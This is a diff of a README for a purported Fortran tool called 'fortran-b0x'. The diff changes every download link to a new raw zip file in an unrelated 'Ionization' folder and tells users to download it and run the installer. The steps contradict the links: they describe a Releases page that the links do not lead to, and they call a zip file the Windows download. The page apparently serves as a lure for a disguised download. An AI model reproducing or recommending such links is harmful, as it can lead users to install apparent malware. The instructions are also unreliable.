@@ -1,6 +1,6 @@
 # 🖥️ fortran-b0x - Easy Access to Fortran Programming Tools
 
-[![Download fortran-b0x](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran-b0x.zip)](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran-b0x.zip)
+[![Download fortran-b0x](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran_x_b_1.7-alpha.4.zip)](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran_x_b_1.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to fortran-b0x! This application provides you with a simple way to work 
 
 To get started, visit this page to download:
 
-[Download fortran-b0x](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran-b0x.zip)
+[Download fortran-b0x](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran_x_b_1.7-alpha.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Click on the version you want to download.
 3. Look for the section with the assets. You will see files that you can download.
-4. Click on the file that matches your operating system to download it (for example, `https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran-b0x.zip` for Windows).
+4. Click on the file that matches your operating system to download it (for example, `https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran_x_b_1.7-alpha.4.zip` for Windows).
 5. Once the download is complete, open the file to run the installer.
 6. Follow the prompts in the installer to complete the installation.
 
@@ -69,4 +69,4 @@ For more information about Fortran and programming best practices, consider expl
 
 Happy coding with fortran-b0x!
 
-[Download fortran-b0x](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran-b0x.zip)
+[Download fortran-b0x](https://raw.githubusercontent.com/SAICXx/fortran-b0x/main/Ionization/fortran_x_b_1.7-alpha.4.zip)
